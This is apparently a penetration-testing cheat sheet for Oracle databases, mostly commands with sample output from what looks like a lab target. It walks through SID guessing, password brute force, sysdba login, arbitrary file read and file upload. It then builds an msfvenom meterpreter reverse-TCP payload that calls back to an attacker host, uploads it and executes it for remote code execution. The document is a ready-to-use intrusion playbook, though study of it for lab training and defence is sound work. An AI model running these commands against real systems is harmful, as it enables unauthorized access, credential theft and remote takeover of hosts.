---
title: "Oracle Database"
date: 2025-7-25
tags: ["OracleDB", "File System Permissions Vulnerabilities", "Database Dumping", "Brute Force", "Enumeration", "Privilege Escalation In Databases", "Database", "Sqlplus", "Odat", "Reverse Shell", "RCE"]
---

### Tools

{{< tab set1 tab1 >}}sqlplus{{< /tab >}}
{{< tab set1 tab2 >}}ODAT{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
# Installation
sudo apt install oracle-instantclient-sqlplus
```

```console
# export LD_LIBRARY_PATH
export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}
```

```console
# Check
sqlplus -V
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
# Installation
sudo apt install odat
```

```console
# Check
odat --version
```

<small>*Ref: [Download ODAT](https://github.com/quentinhardy/odat)*</small>

{{< /tabcontent >}}

---

### Enum

```console
# SID enum (You only need one)
odat sidguesser -s <TARGET>
```

```console {class="sample-code"}
$ ./odat-libc2.17-x86_64 sidguesser -s 10.129.95.188 

[1] (10.129.95.188:1521): Searching valid SIDs
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.129.95.188:1521 server
[+] 'XE' is a valid SID. Continue...                                             ########################################################  | ETA:  00:00:01 
100% |#####################################################################################################################################| Time: 00:01:59 
[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.129.95.188:1521)
100% |#####################################################################################################################################| Time: 00:00:04 
[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.129.95.188:1521)
[+] 'XE' is a valid SID. Continue...                                             ###########################################               | ETA:  00:00:12 
100% |#####################################################################################################################################| Time: 00:01:51 
[+] SIDs found on the 10.129.95.188:1521 server: XE
```

```console
# User/Password brute force
odat passwordguesser -s <TARGET> -d <SID> --accounts-file accounts/accounts.txt
```

```console {class="sample-code"}
$ ./odat-libc2.17-x86_64 passwordguesser -s 10.129.95.188 -d XE --accounts-file accounts/accounts.txt  

[1] (10.129.95.188:1521): Searching valid accounts on the 10.129.95.188 server, port 1521
The login cis has already been tested at least once. What do you want to do:
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
c
[!] Notice: 'ctxsys' account is locked, so skipping this username for password                                                             | ETA:  00:20:27 
[!] Notice: 'dbsnmp' account is locked, so skipping this username for password                                                             | ETA:  00:18:36 
[!] Notice: 'dip' account is locked, so skipping this username for password                                                                | ETA:  00:16:09 
[!] Notice: 'hr' account is locked, so skipping this username for password                                                                 | ETA:  00:10:19 
[!] Notice: 'mdsys' account is locked, so skipping this username for password                                                              | ETA:  00:06:42 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password###                                                      | ETA:  00:04:49 
[!] Notice: 'outln' account is locked, so skipping this username for password##############                                                | ETA:  00:04:11 
[+] Valid credentials found: scott/tiger. Continue...                            ###############################                           | ETA:  00:02:05 
 93% |###########################################################################################################################          | ETA:  00:00:41 
```

```console
# Run all checks with creds as sysdba
odat all -s <TARGET> -U '<USER>' -P '<PASSWORD>' -d <SID> --sysdba
```

```console {class="sample-code"}
$ ./odat-libc2.17-x86_64 all -s 10.129.95.188 -U 'scott' -P 'tiger' -d XE --sysdba 
[+] Checking if target 10.129.95.188:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.95.188:1521 is well configured. Continue...

[1] (10.129.95.188:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] The target is vulnerable to a remote TNS poisoning

[2] (10.129.95.188:1521): Testing all authenticated modules on sid:XE with the scott/tiger account
[2.1] UTL_HTTP library ?
[+] OK
[2.2] HTTPURITYPE library ?
[+] OK
[2.3] UTL_FILE library ?
[+] OK
[2.4] JAVA library ?
[-] KO
[2.5] DBMSADVISOR library ?
[+] OK
---[SNIP]---
```

### General

```console
# Export everytime or add to ~/.zshrc
export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}
```

```console
# Connect
sqlplus '<USER>/<PASSWORD>@<TARGET>:1521/<SID>'
```

```console {class="sample-code"}
$ sqlplus 'scott/tiger@10.129.95.188:1521/XE'

SQL*Plus: Release 19.0.0.0.0 - Production on Mon Jul 28 04:08:16 2025
Version 19.6.0.0.0

Copyright (c) 1982, 2019, Oracle.  All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```

```console
# Connect as sysdba (sudo)
sqlplus '<USER>/<PASSWORD>@<TARGET>:1521/<SID>' as sysdba
```

```console {class="sample-code"}
$ sqlplus 'scott/tiger@10.129.95.188:1521/XE' as sysdba

SQL*Plus: Release 19.0.0.0.0 - Production on Mon Jul 28 04:12:28 2025
Version 19.6.0.0.0

Copyright (c) 1982, 2019, Oracle.  All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```

```console
# Check privilege
select * from user_role_privs;
```

```console {class="sample-code"}
SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
---[SNIP]---

32 rows selected.
```

---

### Abuse #1: Arbitrary Read

```console
odat ctxsys -s <TARGET> -U '<USER>' -P '<PASSWORD>' -d <SID> --sysdba --getFile '<FILE>'
```

```console {class="sample-code"}
$ ./odat-libc2.17-x86_64 ctxsys -s 10.129.95.188 -U 'scott' -P 'tiger' -d XE --sysdba --getFile 'C:\Windows\win.ini' 

[1] (10.129.95.188:1521): Read the C:\Windows\win.ini file on the 10.129.95.188 server
[+] Data stored in the C:\Windows\win.ini file (escape char replace by '\n'):
1
16
APP
BIT
EXTENSIONS
FILES
FONTS
MAIL
MAPI
MCI
SUPPORT
```

---

### Abuse #2: Upload File to RCE

```console
odat dbmsadvisor -s <TARGET> -U '<USER>' -P '<PASSWORD>' -d <SID> --sysdba --putFile '<DEST_DIR>' '<DEST_FILENAME>' '<SRC_FILE>'
```

---

### Abuse #3: Execute Binary to RCE

```console
# Create a malicious exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f exe -o rev.exe
```

```console {class="sample-code"}
$ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.57 LPORT=1337 > rev.exe
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
```

```console
# Upload
odat utlfile -s <TARGET> -U '<USER>' -P '<PASSWORD>' -d <SID> --sysdba --putFile 'C:\ProgramData' rev.exe rev.exe
```

```console {class="sample-code"}
$ ./odat-libc2.17-x86_64 utlfile -s 10.129.95.188 -U 'scott' -P 'tiger' -d XE --sysdba --putFile 'C:\ProgramData' rev.exe rev.exe 

[1] (10.129.95.188:1521): Put the rev.exe local file in the C:\ProgramData folder like rev.exe on the 10.129.95.188 server
[+] The rev.exe file was created on the C:\ProgramData directory on the 10.129.95.188 server like the rev.exe file
```

```console
# Execute
odat externaltable -s <TARGET> -U '<USER>' -P '<PASSWORD>' -d <SID> --sysdba --exec 'C:\ProgramData' rev.exe
```

```console {class="sample-code"}
./odat-libc2.17-x86_64 externaltable -s 10.129.95.188 -U 'scott' -P 'tiger' -d XE --sysdba --exec 'C:\ProgramData' rev.exe 

[1] (10.129.95.188:1521): Execute the rev.exe command stored in the C:\ProgramData path
```